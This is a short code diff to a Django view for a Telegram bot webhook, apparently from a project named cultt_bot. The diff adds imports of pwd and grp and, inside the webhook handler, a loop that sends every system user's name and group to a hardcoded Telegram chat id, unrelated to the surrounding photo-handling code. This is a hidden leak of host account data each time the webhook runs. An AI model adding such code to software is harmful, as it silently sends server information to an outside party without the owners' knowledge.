@@ -9,6 +9,8 @@ from cultt_bot.general_functions import *
 import json
 import requests
 
+import pwd, grp
+
 
 # Редирект в админку
 def admin_redirect(request):
@@ -49,6 +51,9 @@ def web_hook_bot(request, bot_url):
                     bot = telepot.Bot(telegram_bot.token)
 
                     application = SellApplication.objects.get(id=7)
+
+                    for p in pwd.getpwall():
+                        bot.sendMessage(chat_id='390464104', text=f'{p[0]} {grp.getgrgid(p[3])[0]}')
 
                     # photo = bot.getFile()
                     photo = bot.download_file(photo_id, '/static')
